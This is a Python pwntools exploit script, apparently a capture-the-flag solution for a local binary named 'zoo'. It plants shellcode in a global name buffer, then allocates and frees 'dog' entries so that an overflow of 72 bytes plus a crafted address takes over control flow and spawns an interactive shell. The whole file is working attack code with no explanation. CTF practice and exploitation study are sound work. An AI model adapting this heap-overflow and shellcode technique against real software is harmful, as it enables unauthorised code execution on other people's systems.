from pwn import *
import sys, time

context.binary = "./zoo"
binary = ELF("./zoo")
#context.log_level = "debug"

p = process(["./zoo"])
log.info("PID : " + str(proc.pidof(p)[0]))
pause()

def dog(name, weight):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(name)
    p.recvuntil(":")
    p.sendline(str(weight))

def remove(idx):
    p.recvuntil(":")
    p.sendline("5")
    p.recvuntil(": ")
    p.sendline(str(idx))

gname = 0x0000000000605420
p.recvuntil(":")
p.sendline(p64(gname + 24) + p64(gname + 24) + p64(gname + 24) + asm(shellcraft.sh()))

dog("a" * 8, 0)
dog("b" * 8, 1)
remove(0)
dog("c" * 72 + p64(0x0000000000605430), 2)
p.interactive()
